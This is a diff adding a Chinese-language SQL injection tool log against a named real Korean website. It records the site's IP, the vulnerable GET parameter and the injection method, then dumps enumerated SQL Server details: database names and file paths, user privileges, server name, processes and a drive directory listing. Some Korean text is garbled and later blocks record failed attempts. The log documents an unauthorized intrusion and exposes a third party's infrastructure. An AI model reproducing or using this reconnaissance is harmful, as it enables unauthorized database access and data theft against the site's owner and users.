@@ -1,0 +1,246 @@
+■漏洞信息:============================================================
+ ·URL:http://www.theplay.co.kr/customer/view.asp?page=2&category=notice&searchKey=&searchWord=&orderKey=&orderDir=&hg=&intNo=4920
+ ·页面标题：榴芭框捞 葛牢 浚磐抛牢刚飘 :::::: 歹敲饭捞 ::::::
+
+ ·参数:page=2&category=notice&searchKey=&searchWord=&orderKey=&orderDir=&hg=&intNo=4920
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:118.217.181.179
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 11:41:36 GMT
+Server: WWW Server/1.1
+X-Powered-By: ASP.NET
+Pragma: no-cache
+cache-control: no-store
+Pragma: no-cache
+cache-control: no-store
+Content-Length: 45241
+Content-Type: text/html
+Expires: Sun, 03 Apr 2011 11:40:36 GMT
+Set-Cookie: jBoard2=4920=T; expires=Sun, 03-Apr-2011 15:00:00 GMT; path=/
+Set-Cookie: ASPSESSIONIDCARSBARD=PELAHNFDANAGGFBIOFFFONEM; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：amateurgirl
+- 用户名：theplay
+- 版本：Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+	Aug  6 2000 00:57:48 
+	Copyright (c) 1988-2000 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：KSIDC-748D19A0B
+- 服务名：MSSQLSERVER
+- 系统用户名：theplay
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+amateurgirl	D:\001_DBData\amateurgirl_Data.MDF	
+cosplay	D:\001_DBData\cosplay_Data.MDF	
+master	d:\MSSQL\data\master.mdf	
+model	d:\MSSQL\data\model.mdf	
+msdb	d:\MSSQL\data\msdbdata.mdf	
+Northwind	d:\MSSQL\data\northwnd.mdf	
+pubs	d:\MSSQL\data\pubs.mdf	
+tempdb	d:\MSSQL\data\tempdb.mdf	
+test_amature	d:\MSSQL\data\test_amature_Data.MDF	
+theplayBAK	D:\mssql\data\theplayBAK_Data.MDF	
+thetest	D:\mssql\data\thetest_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	runnable	KSIDC-748D19A0B	3028	SELECT	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+KSIDC-748D19A0B	SQL Server	SQLOLEDB	KSIDC-748D19A0B		KSIDC-748D19A0B	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+000_Web_Site\
+001_DBData\
+3fd1d304a6af3242db3a7a0c9718577f\
+999_橇肺弊伐\
+悼康惑\
+dong\
+main\
+MSSQL\
+nWmail\
+RECYCLER\
+System Volume Information\
+UPfold\
+upload\
+WEB_Site\
+webconfig\
+Book1.csv
+Book1.xls
+
+
+■数据库信息:============================================================
+- 数据库名：amateurgirl
+- 用户名：theplay
+- 版本：Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+	Aug  6 2000 00:57:48 
+	Copyright (c) 1988-2000 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：KSIDC-748D19A0B
+- 服务名：MSSQLSERVER
+- 系统用户名：theplay
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+amateurgirl	D:\001_DBData\amateurgirl_Data.MDF	
+cosplay	D:\001_DBData\cosplay_Data.MDF	
+master	d:\MSSQL\data\master.mdf	
+model	d:\MSSQL\data\model.mdf	
+msdb	d:\MSSQL\data\msdbdata.mdf	
+Northwind	d:\MSSQL\data\northwnd.mdf	
+pubs	d:\MSSQL\data\pubs.mdf	
+tempdb	d:\MSSQL\data\tempdb.mdf	
+test_amature	d:\MSSQL\data\test_amature_Data.MDF	
+theplayBAK	D:\mssql\data\theplayBAK_Data.MDF	
+thetest	D:\mssql\data\thetest_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+Microsoft㈢ Windows㈢ Operating System	sleeping	KSIDC-748D19A0B	3028	AWAITING COMMAND	IUSR_KSIDC-748D19A0B	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+KSIDC-748D19A0B	SQL Server	SQLOLEDB	KSIDC-748D19A0B		KSIDC-748D19A0B	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
